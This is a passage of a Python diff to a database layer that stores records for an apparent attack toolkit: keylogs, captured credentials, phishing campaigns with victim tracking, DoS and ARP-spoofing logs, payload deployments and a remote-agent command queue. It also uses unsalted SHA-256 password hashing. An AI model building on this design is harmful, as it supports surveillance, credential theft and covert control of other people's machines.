+            CREATE TABLE IF NOT EXISTS clipboard_history (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                 content TEXT,
                 source TEXT
-            )""",
-            """CREATE TABLE IF NOT EXISTS docker_scans (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS dns_cache (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                domain TEXT NOT NULL,
+                ip TEXT NOT NULL,
+                resolved_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                expires_at DATETIME
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS docker_scans (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                 image TEXT NOT NULL,
@@ -963,8 +1100,10 @@ class DatabaseManager:
                 severity TEXT,
                 scan_time REAL,
                 success BOOLEAN DEFAULT 1
-            )""",
-            """CREATE TABLE IF NOT EXISTS cracking_jobs (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS cracking_jobs (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 job_id TEXT UNIQUE NOT NULL,
                 hash_type TEXT NOT NULL,
@@ -975,28 +1114,10 @@ class DatabaseManager:
                 started_at DATETIME,
                 completed_at DATETIME,
                 cracked BOOLEAN DEFAULT 0
-            )""",
-            """CREATE TABLE IF NOT EXISTS arp_spoofing (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                target_ip TEXT NOT NULL,
-                gateway_ip TEXT NOT NULL,
-                interface TEXT,
-                status TEXT DEFAULT 'active',
-                packets_sent INTEGER DEFAULT 0,
-                duration REAL,
-                started_at DATETIME,
-                ended_at DATETIME
-            )""",
-            """CREATE TABLE IF NOT EXISTS mac_info (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                mac_address TEXT UNIQUE NOT NULL,
-                vendor TEXT,
-                ip_address TEXT,
-                hostname TEXT,
-                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
-                last_seen DATETIME
-            )""",
-            """CREATE TABLE IF NOT EXISTS nat_info (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS nat_info (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 public_ip TEXT,
                 private_ip TEXT,
@@ -1005,8 +1126,21 @@ class DatabaseManager:
                 isp TEXT,
                 nat_type TEXT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-            )""",
-            """CREATE TABLE IF NOT EXISTS email_messages (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS platform_commands (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                platform TEXT NOT NULL,
+                command TEXT NOT NULL,
+                user_id TEXT,
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+                executed BOOLEAN DEFAULT 0,
+                result TEXT
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS email_messages (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 to_address TEXT NOT NULL,
                 subject TEXT NOT NULL,
@@ -1017,8 +1151,10 @@ class DatabaseManager:
                 sent_at DATETIME,
                 status TEXT DEFAULT 'draft',
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-            )""",
-            """CREATE TABLE IF NOT EXISTS pdf_reports (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS pdf_reports (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 title TEXT NOT NULL,
                 target TEXT,
@@ -1026,7 +1162,8 @@ class DatabaseManager:
                 file_path TEXT NOT NULL,
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                 status TEXT DEFAULT 'generated'
-            )"""
+            )
+            """
         ]
         
         for sql in tables:
@@ -1065,15 +1202,15 @@ class DatabaseManager:
         except Exception as e:
             print(f"Failed to log command: {e}")
     
-    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
+    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
         try:
-            if include_blocked:
-                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
-            else:
-                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
-            return [dict(row) for row in rows]
-        except:
-            return []
+            self.conn.execute(
+                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
+                (threat_type, source_ip, severity, description)
+            )
+            self.conn.commit()
+        except Exception as e:
+            print(f"Failed to log threat: {e}")
     
     def add_managed_ip(self, ip: str, domain: str = None, added_by: str = "system", notes: str = "") -> bool:
         try:
@@ -1087,37 +1224,196 @@ class DatabaseManager:
         except:
             return False
     
-    def get_statistics(self) -> Dict:
-        stats = {}
+    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
         try:
-            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
-            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
-            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
-            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
-            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
-            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
-            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
-            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
-            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
-            stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
-            stats['total_deployments'] = self.conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
-            stats['total_docker_scans'] = self.conn.execute("SELECT COUNT(*) FROM docker_scans").fetchone()[0]
-            stats['total_cracking_jobs'] = self.conn.execute("SELECT COUNT(*) FROM cracking_jobs").fetchone()[0]
-            stats['total_arp_spoofs'] = self.conn.execute("SELECT COUNT(*) FROM arp_spoofing").fetchone()[0]
-            stats['total_mac_entries'] = self.conn.execute("SELECT COUNT(*) FROM mac_info").fetchone()[0]
-            stats['total_nat_entries'] = self.conn.execute("SELECT COUNT(*) FROM nat_info").fetchone()[0]
-            stats['total_emails'] = self.conn.execute("SELECT COUNT(*) FROM email_messages").fetchone()[0]
-            stats['total_pdf_reports'] = self.conn.execute("SELECT COUNT(*) FROM pdf_reports").fetchone()[0]
+            self.conn.execute(
+                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
+                (reason, ip)
+            )
+            self.conn.commit()
+            return True
         except:
-            pass
-        return stats
+            return False
     
-    def get_ssh_connections(self) -> List[Dict]:
+    def unblock_ip(self, ip: str) -> bool:
         try:
-            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
+            self.conn.execute(
+                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
+                (ip,)
+            )
+            self.conn.commit()
+            return True
+        except:
+            return False
+    
+    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
+        try:
+            if include_blocked:
+                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
+            else:
+                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
             return [dict(row) for row in rows]
         except:
             return []
+    
+    def add_mac_info(self, mac_address: str, vendor: str = None, ip_address: str = None,
+                    hostname: str = None) -> bool:
+        try:
+            self.conn.execute(
+                """INSERT OR REPLACE INTO mac_info 
+                   (mac_address, vendor, ip_address, hostname, last_seen)
+                   VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)""",
+                (mac_address, vendor, ip_address, hostname)
+            )
+            self.conn.commit()
+            return True
+        except Exception as e:
+            print(f"Failed to add MAC info: {e}")
+            return False
+    
+    def get_mac_info(self, mac_address: str) -> Optional[Dict]:
+        try:
+            row = self.conn.execute(
+                "SELECT * FROM mac_info WHERE mac_address = ?", (mac_address,)
+            ).fetchone()
+            return dict(row) if row else None
+        except:
+            return None
+    
+    def add_arp_spoof(self, target_ip: str, gateway_ip: str, interface: str) -> bool:
+        try:
+            self.conn.execute(
+                """INSERT OR REPLACE INTO arp_spoofing 
+                   (target_ip, gateway_ip, interface, started_at, status)
+                   VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'active')""",
+                (target_ip, gateway_ip, interface)
+            )
+            self.conn.commit()
+            return True
+        except:
+            return False
+    
+    def update_arp_spoof(self, target_ip: str, gateway_ip: str, packets_sent: int,
+                         duration: float, ended_at: str) -> bool:
+        try:
+            self.conn.execute(
+                """UPDATE arp_spoofing 
+                   SET packets_sent = ?, duration = ?, ended_at = ?, status = 'completed'
+                   WHERE target_ip = ? AND gateway_ip = ?""",
+                (packets_sent, duration, ended_at, target_ip, gateway_ip)
+            )
+            self.conn.commit()
+            return True
+        except:
+            return False
+    
+    def get_arp_spoofs(self, status: str = None) -> List[Dict]:
+        try:
+            if status:
+                rows = self.conn.execute(
+                    "SELECT * FROM arp_spoofing WHERE status = ? ORDER BY started_at DESC",
+                    (status,)
+                )
+            else:
+                rows = self.conn.execute("SELECT * FROM arp_spoofing ORDER BY started_at DESC")
+            return [dict(row) for row in rows]
+        except:
+            return []
+    
+    def add_nat_info(self, public_ip: str, private_ip: str, router_ip: str,
+                    country: str, isp: str, nat_type: str) -> bool:
+        try:
+            self.conn.execute(
+                """INSERT INTO nat_info 
+                   (public_ip, private_ip, router_ip, country, isp, nat_type)
+                   VALUES (?, ?, ?, ?, ?, ?)""",
+                (public_ip, private_ip, router_ip, country, isp, nat_type)
+            )
+            self.conn.commit()
+            return True
+        except:
+            return False
+    
+    def get_nat_info(self, limit: int = 1) -> List[Dict]:
+        try:
+            rows = self.conn.execute(
+                "SELECT * FROM nat_info ORDER BY timestamp DESC LIMIT ?", (limit,)
+            )
+            return [dict(row) for row in rows]
+        except:
+            return []
+    
+    def add_domain_host(self, domain_host: 'DomainHost') -> bool:
+        try:
+            self.conn.execute(
+                """INSERT OR REPLACE INTO domain_hosting 
+                   (id, ip, domain, hosting_path, created_at, active, port)
+                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
+                (domain_host.id, domain_host.ip, domain_host.domain, domain_host.hosting_path,
+                 domain_host.created_at, domain_host.active, 8080)
+            )
+            self.conn.commit()
+            return True
+        except Exception as e:
+            print(f"Failed to add domain host: {e}")
+            return False
+    
+    def get_domain_hosts(self, active_only: bool = True) -> List[Dict]:
+        try:
+            if active_only:
+                rows = self.conn.execute("SELECT * FROM domain_hosting WHERE active = 1 ORDER BY created_at DESC")
+            else:
+                rows = self.conn.execute("SELECT * FROM domain_hosting ORDER BY created_at DESC")
+            return [dict(row) for row in rows]
+        except:
+            return []
+    
+    def resolve_domain(self, domain: str) -> Optional[str]:
+        try:
+            row = self.conn.execute(
+                "SELECT ip FROM domain_hosting WHERE domain = ? AND active = 1",
+                (domain,)
+            ).fetchone()
+            if row:
+                return row['ip']
+            
+            row = self.conn.execute(
+                "SELECT ip FROM dns_cache WHERE domain = ? AND expires_at > datetime('now')",
+                (domain,)
+            ).fetchone()
+            if row:
+                return row['ip']
+            
+            ip = socket.gethostbyname(domain)
+            if ip:
+                self.conn.execute(
+                    "INSERT INTO dns_cache (domain, ip, expires_at) VALUES (?, ?, datetime('now', '+1 hour'))",
+                    (domain, ip)
+                )
+                self.conn.commit()
+                return ip
+            return None
+        except:
+            return None
+    
+    def resolve_ip(self, ip: str) -> Optional[str]:
+        try:
+            row = self.conn.execute(
+                "SELECT domain FROM domain_hosting WHERE ip = ? AND active = 1",
+                (ip,)
+            ).fetchone()
+            if row:
+                return row['domain']
+            
+            try:
+                domain = socket.gethostbyaddr(ip)[0]
+                if domain:
+                    return domain
+            except:
+                pass
+            return None
+        except:
+            return None
     
     def add_ssh_connection(self, conn: SSHConnection) -> bool:
         try:
@@ -1133,6 +1429,13 @@ class DatabaseManager:
         except Exception as e:
             print(f"Failed to add SSH connection: {e}")
             return False
+    
+    def get_ssh_connections(self) -> List[Dict]:
+        try:
+            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
+            return [dict(row) for row in rows]
+        except:
+            return []
     
     def log_ssh_command(self, connection_id: str, command: str, output: str,
                        exit_code: int, execution_time: float):
@@ -1161,19 +1464,36 @@ class DatabaseManager:
         except Exception as e:
             print(f"Failed to log traffic: {e}")
     
-    def save_keylog(self, text: str, window: str = "", process: str = "", screenshot_path: str = ""):
+    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str,
+                      scan_time: float, success: bool):
         try:
             self.conn.execute(
-                "INSERT INTO keylogs (text, window, process, screenshot_path) VALUES (?, ?, ?, ?)",
-                (text[:5000], window[:100], process[:100], screenshot_path)
+                """INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
+                   VALUES (?, ?, ?, ?, ?)""",
+                (target, json.dumps(vulnerabilities), output_file, scan_time, success)
             )
             self.conn.commit()
         except Exception as e:
-            print(f"Failed to save keylog: {e}")
+            print(f"Failed to log Nikto scan: {e}")
     
-    def get_keylogs(self, limit: int = 100) -> List[Dict]:
+    def save_phishing_link(self, link: PhishingLink) -> bool:
         try:
-            rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
+            self.conn.execute(
+                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
+                   VALUES (?, ?, ?, ?, ?, ?)""",
+                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
+            )
+            self.conn.commit()
+            return True
+        except:
+            return False
+    
+    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
+        try:
+            if active_only:
+                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
+            else:
+                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
             return [dict(row) for row in rows]
         except:
             return []
@@ -1203,15 +1523,293 @@ class DatabaseManager:
         except:
             return []
     
-    def save_deployment(self, deployment: Deployment) -> bool:
+    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
+        try:
+            rows = self.conn.execute(
+                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
+            )
+            return [dict(row) for row in rows]
+        except:
+            return []
+    
+    def get_statistics(self) -> Dict:
+        stats = {}
+        try:
+            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
+            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
+            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
+            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
+            stats['total_domain_hosts'] = self.conn.execute("SELECT COUNT(*) FROM domain_hosting").fetchone()[0]
+            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
+            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
+            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
+            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
+            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
+            stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
+            stats['total_agents'] = self.conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
+            stats['total_deployments'] = self.conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
+            stats['total_docker_scans'] = self.conn.execute("SELECT COUNT(*) FROM docker_scans").fetchone()[0]
+            stats['total_cracking_jobs'] = self.conn.execute("SELECT COUNT(*) FROM cracking_jobs").fetchone()[0]
+            stats['total_arp_spoofs'] = self.conn.execute("SELECT COUNT(*) FROM arp_spoofing").fetchone()[0]
+            stats['total_mac_entries'] = self.conn.execute("SELECT COUNT(*) FROM mac_info").fetchone()[0]
+            stats['total_nat_entries'] = self.conn.execute("SELECT COUNT(*) FROM nat_info").fetchone()[0]
+            stats['total_emails'] = self.conn.execute("SELECT COUNT(*) FROM email_messages").fetchone()[0]
+            stats['total_pdf_reports'] = self.conn.execute("SELECT COUNT(*) FROM pdf_reports").fetchone()[0]
+        except:
+            pass
+        return stats
+    
+    def verify_user(self, username: str, password: str) -> Optional[Dict]:
+        try:
+            import hashlib
+            password_hash = hashlib.sha256(password.encode()).hexdigest()
+            row = self.conn.execute(
+                "SELECT * FROM users WHERE username = ? AND password_hash = ?",
+                (username, password_hash)
+            ).fetchone()
+            return dict(row) if row else None
+        except:
+            return None
+    
+    def create_session(self, user_id: int) -> str:
+        try:
+            session_id = secrets.token_urlsafe(32)
+            expires_at = datetime.datetime.now() + datetime.timedelta(hours=24)
+            self.conn.execute(
+                "INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)",
+                (session_id, user_id, expires_at.isoformat())
+            )
+            self.conn.commit()
+            return session_id
+        except:
+            return None
+    
+    def verify_session(self, session_id: str) -> Optional[Dict]:
+        try:
+            row = self.conn.execute(
+                """SELECT s.*, u.username, u.role 
+                   FROM sessions s 
+                   JOIN users u ON s.user_id = u.id 
+                   WHERE s.id = ? AND s.expires_at > datetime('now')""",
+                (session_id,)
+            ).fetchone()
+            return dict(row) if row else None
+        except:
+            return None
+    
+    def save_keylog(self, text: str, window: str = "", process: str = "", screenshot_path: str = ""):
+        try:
+            self.conn.execute(
+                "INSERT INTO keylogs (text, window, process, screenshot_path) VALUES (?, ?, ?, ?)",
+                (text[:5000], window[:100], process[:100], screenshot_path)
+            )
+            self.conn.commit()
+        except Exception as e:
+            print(f"Failed to save keylog: {e}")
+    
+    def get_keylogs(self, limit: int = 100) -> List[Dict]:
+        try:
+            rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
+            return [dict(row) for row in rows]
+        except:
+            return []
+    
+    def save_spear_phishing_campaign(self, campaign: 'SpearPhishingCampaign') -> bool:
+        try:
+            self.conn.execute(
+                """INSERT OR REPLACE INTO spear_phishing_campaigns 
+                   (id, name, template, subject, from_email, targets, sent_count, open_count, click_count, status, created_at, scheduled_time)
+                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+                (campaign.id, campaign.name, campaign.template, campaign.subject,
+                 campaign.from_email, json.dumps(campaign.targets), campaign.sent_count,
+                 campaign.open_count, campaign.click_count, campaign.status,
+                 campaign.created_at, campaign.scheduled_time)
+            )
+            self.conn.commit()
+            return True
+        except Exception as e:
+            print(f"Failed to save campaign: {e}")
+            return False
+    
+    def get_spear_phishing_campaigns(self) -> List[Dict]:
+        try:
+            rows = self.conn.execute("SELECT * FROM spear_phishing_campaigns ORDER BY created_at DESC")
+            return [dict(row) for row in rows]
+        except:
+            return []
+    
+    def track_email_open(self, campaign_id: str, target_email: str):
+        try:
+            self.conn.execute(
+                """INSERT OR REPLACE INTO email_tracking 
+                   (campaign_id, target_email, opened, opened_at)
+                   VALUES (?, ?, 1, CURRENT_TIMESTAMP)""",
+                (campaign_id, target_email)
+            )
+            self.conn.commit()
+            self.conn.execute(
+                "UPDATE spear_phishing_campaigns SET open_count = open_count + 1 WHERE id = ?",
+                (campaign_id,)
+            )
+            self.conn.commit()
+        except Exception as e:
+            print(f"Failed to track email open: {e}")
+    
+    def track_email_click(self, campaign_id: str, target_email: str):
+        try:
+            self.conn.execute(
+                """UPDATE email_tracking 
+                   SET clicked = 1, clicked_at = CURRENT_TIMESTAMP 
+                   WHERE campaign_id = ? AND target_email = ?""",
+                (campaign_id, target_email)
+            )
+            self.conn.commit()
+            self.conn.execute(
+                "UPDATE spear_phishing_campaigns SET click_count = click_count + 1 WHERE id = ?",
+                (campaign_id,)
+            )
+            self.conn.commit()
+        except Exception as e:
+            print(f"Failed to track email click: {e}")
+    
+    def log_dos_attack(self, attack_type: str, target: str, port: int, duration: int,
+                      packets_sent: int, status: str, executed_by: str = "system"):
+        try:
+            self.conn.execute(
+                """INSERT INTO dos_attacks 
+                   (attack_type, target, port, duration, packets_sent, status, executed_by)
+                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
+                (attack_type, target, port, duration, packets_sent, status, executed_by)
+            )
+            self.conn.commit()
+        except Exception as e:
+            print(f"Failed to log DOS attack: {e}")
+    
+    def get_dos_attacks(self, limit: int = 10) -> List[Dict]:
+        try:
+            rows = self.conn.execute("SELECT * FROM dos_attacks ORDER BY timestamp DESC LIMIT ?", (limit,))
+            return [dict(row) for row in rows]
+        except:
+            return []
+    
+    def register_agent(self, agent_id: str, name: str, ip_address: str) -> bool:
+        try:
+            self.conn.execute(
+                """INSERT OR REPLACE INTO agents (id, name, ip_address, status, last_heartbeat)
+                   VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)""",
+                (agent_id, name, ip_address)
+            )
+            self.conn.commit()
+            return True
+        except Exception as e:
+            print(f"Failed to register agent: {e}")
+            return False
+    
+    def update_agent_heartbeat(self, agent_id: str):
+        try:
+            self.conn.execute(
+                "UPDATE agents SET last_heartbeat = CURRENT_TIMESTAMP, status = 'online' WHERE id = ?",
+                (agent_id,)
+            )
+            self.conn.commit()
+        except Exception as e:
+            print(f"Failed to update agent heartbeat: {e}")
+    
+    def add_agent_command(self, agent_id: str, command: str) -> bool:
+        try:
+            self.conn.execute(
+                "INSERT INTO agent_commands (agent_id, command) VALUES (?, ?)",
+                (agent_id, command)
+            )
+            self.conn.commit()
+            return True
+        except Exception as e:
+            print(f"Failed to add agent command: {e}")
+            return False
+    
+    def get_pending_agent_commands(self, agent_id: str) -> List[Dict]:
+        try:
+            rows = self.conn.execute(
+                "SELECT * FROM agent_commands WHERE agent_id = ? AND status = 'pending' ORDER BY id",
+                (agent_id,)
+            )
+            return [dict(row) for row in rows]
+        except:
+            return []
+    
+    def update_agent_command_result(self, command_id: int, result: str, status: str = "completed"):
+        try:
+            self.conn.execute(
+                "UPDATE agent_commands SET result = ?, status = ?, executed_at = CURRENT_TIMESTAMP WHERE id = ?",
+                (result[:5000], status, command_id)
+            )
+            self.conn.commit()
+        except Exception as e:
+            print(f"Failed to update agent command result: {e}")
+    
+    def get_agents(self) -> List[Dict]:
+        try:
+            rows = self.conn.execute("SELECT * FROM agents ORDER BY created_at DESC")
+            return [dict(row) for row in rows]
+        except:
+            return []
+    
+    def get_agent(self, agent_id: str) -> Optional[Dict]:
+        try:
+            row = self.conn.execute("SELECT * FROM agents WHERE id = ?", (agent_id,)).fetchone()
+            return dict(row) if row else None
+        except:
+            return None
+    
+    def save_network_packet(self, source_ip: str, dest_ip: str, source_port: int,
+                           dest_port: int, protocol: str, size: int, payload: str = ""):
+        try:
+            self.conn.execute(
+                """INSERT INTO network_packets 
+                   (source_ip, dest_ip, source_port, dest_port, protocol, size, payload)
+                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
+                (source_ip, dest_ip, source_port, dest_port, protocol, size, payload[:1000])
+            )
+            self.conn.commit()
+        except Exception as e:
+            print(f"Failed to save network packet: {e}")
+    
+    def get_network_packets(self, limit: int = 100) -> List[Dict]:
+        try:
+            rows = self.conn.execute("SELECT * FROM network_packets ORDER BY timestamp DESC LIMIT ?", (limit,))
+            return [dict(row) for row in rows]
+        except:
+            return []
+    
+    def log_performance_metrics(self, cpu: float, memory: float, disk: float,
+                               net_sent: int, net_recv: int, connections: int):
+        try:
+            self.conn.execute(
+                """INSERT INTO performance_metrics 
+                   (cpu_percent, memory_percent, disk_percent, network_sent, network_recv, connections_count)
+                   VALUES (?, ?, ?, ?, ?, ?)""",
+                (cpu, memory, disk, net_sent, net_recv, connections)
+            )
+            self.conn.commit()
+        except Exception as e:
+            print(f"Failed to log performance metrics: {e}")
+    
+    def get_performance_metrics(self, limit: int = 60) -> List[Dict]:
+        try:
+            rows = self.conn.execute("SELECT * FROM performance_metrics ORDER BY timestamp DESC LIMIT ?", (limit,))
+            return [dict(row) for row in rows]
+        except:
+            return []
+    
+    def save_deployment(self, deployment: 'Deployment') -> bool:
         try:
             self.conn.execute(
                 """INSERT OR REPLACE INTO deployments 
-                   (id, name, type, payload, target, created_at, delivered, opened, executed)
-                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+                   (id, name, type, payload, target, created_at, delivered, opened, executed, data)
+                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                 (deployment.id, deployment.name, deployment.type, deployment.payload,
                  deployment.target, deployment.created_at, deployment.delivered,
-                 deployment.opened, deployment.executed)
+                 deployment.opened, deployment.executed, "{}")
             )
             self.conn.commit()
             return True
@@ -1222,6 +1820,43 @@ class DatabaseManager:
     def get_deployments(self) -> List[Dict]:
         try:
             rows = self.conn.execute("SELECT * FROM deployments ORDER BY created_at DESC")
+            return [dict(row) for row in rows]
+        except:
+            return []
+    
+    def update_deployment_status(self, deployment_id: str, delivered: bool = None,
+                                 opened: bool = None, executed: bool = None):
+        try:
+            updates = []
+            if delivered is not None:
+                updates.append(f"delivered = {1 if delivered else 0}")
+            if opened is not None:
+                updates.append(f"opened = {1 if opened else 0}")
+            if executed is not None:
+                updates.append(f"executed = {1 if executed else 0}")
+            
+            if updates:
+                self.conn.execute(
+                    f"UPDATE deployments SET {', '.join(updates)} WHERE id = ?",
+                    (deployment_id,)
+                )
+                self.conn.commit()
+        except Exception as e:
+            print(f"Failed to update deployment: {e}")
+    
+    def save_clipboard(self, content: str, source: str = "system"):
+        try:
+            self.conn.execute(
+                "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
+                (content[:5000], source)
+            )
+            self.conn.commit()
+        except Exception as e:
+            print(f"Failed to save clipboard: {e}")
+    
+    def get_clipboard_history(self, limit: int = 50) -> List[Dict]:
+        try:
+            rows = self.conn.execute("SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,))
             return [dict(row) for row in rows]
         except:
             return []
@@ -1273,76 +1908,33 @@ class DatabaseManager:
         except:
             return []
     
-    def add_arp_spoof(self, target_ip: str, gateway_ip: str, interface: str) -> bool:
+    def log_platform_command(self, platform: str, command: str, user_id: str = None):
         try:
             self.conn.execute(
-                """INSERT OR REPLACE INTO arp_spoofing 
-                   (target_ip, gateway_ip, interface, started_at, status)
-                   VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'active')""",
-                (target_ip, gateway_ip, interface)
+                "INSERT INTO platform_commands (platform, command, user_id) VALUES (?, ?, ?)",
+                (platform, command, user_id)
             )
             self.conn.commit()
-            return True
-        except:
-            return False
+        except Exception as e:
+            print(f"Failed to log platform command: {e}")
     
-    def update_arp_spoof(self, target_ip: str, gateway_ip: str, packets_sent: int,
-                         duration: float, ended_at: str) -> bool:
+    def get_platform_commands(self, platform: str = None, limit: int = 50) -> List[Dict]:
         try:
-            self.conn.execute(
-                """UPDATE arp_spoofing 
-                   SET packets_sent = ?, duration = ?, ended_at = ?, status = 'completed'
-                   WHERE target_ip = ? AND gateway_ip = ?""",
-                (packets_sent, duration, ended_at, target_ip, gateway_ip)
-            )
-            self.conn.commit()
-            return True
-        except:
-            return False
-    
-    def get_arp_spoofs(self, status: str = None) -> List[Dict]:
-        try:
-            if status:
+            if platform:
                 rows = self.conn.execute(
-                    "SELECT * FROM arp_spoofing WHERE status = ? ORDER BY started_at DESC",
-                    (status,)
+                    "SELECT * FROM platform_commands WHERE platform = ? ORDER BY timestamp DESC LIMIT ?",
+                    (platform, limit)
                 )
             else:
-                rows = self.conn.execute("SELECT * FROM arp_spoofing ORDER BY started_at DESC")
+                rows = self.conn.execute(
+                    "SELECT * FROM platform_commands ORDER BY timestamp DESC LIMIT ?",
+                    (limit,)
+                )
             return [dict(row) for row in rows]
         except:
             return []
     
-    def add_mac_info(self, mac_address: str, vendor: str = None, ip_address: str = None,
-                    hostname: str = None) -> bool:
-        try:
-            self.conn.execute(
-                """INSERT OR REPLACE INTO mac_info 
-                   (mac_address, vendor, ip_address, hostname, last_seen)
-                   VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)""",
-                (mac_address, vendor, ip_address, hostname)
-            )
-            self.conn.commit()
-            return True
-        except Exception as e:
-            print(f"Failed to add MAC info: {e}")
-            return False
-    
-    def add_nat_info(self, public_ip: str, private_ip: str, router_ip: str,
-                    country: str, isp: str, nat_type: str) -> bool:
-        try:
-            self.conn.execute(
-                """INSERT INTO nat_info 
-                   (public_ip, private_ip, router_ip, country, isp, nat_type)
-                   VALUES (?, ?, ?, ?, ?, ?)""",
-                (public_ip, private_ip, router_ip, country, isp, nat_type)
-            )
-            self.conn.commit()
-            return True
-        except:
-            return False
-    
-    def save_email(self, email_msg: EmailMessage) -> bool:
+    def save_email(self, email_msg: 'EmailMessage') -> bool:
         try:
             self.conn.execute(
                 """INSERT INTO email_messages 
@@ -1380,7 +1972,17 @@ class DatabaseManager:
             print(f"Failed to get emails: {e}")
             return []
     
-    def save_pdf_report(self, report: PDFReport) -> bool:
+    def update_email_status(self, email_id: int, status: str):
+        try:
+            self.conn.execute(
+                "UPDATE email_messages SET status = ?, sent_at = CURRENT_TIMESTAMP WHERE id = ?",
+                (status, email_id)
+            )
+            self.conn.commit()
+        except Exception as e:
+            print(f"Failed to update email status: {e}")
+    
+    def save_pdf_report(self, report: 'PDFReport') -> bool:
         try:
             self.conn.execute(
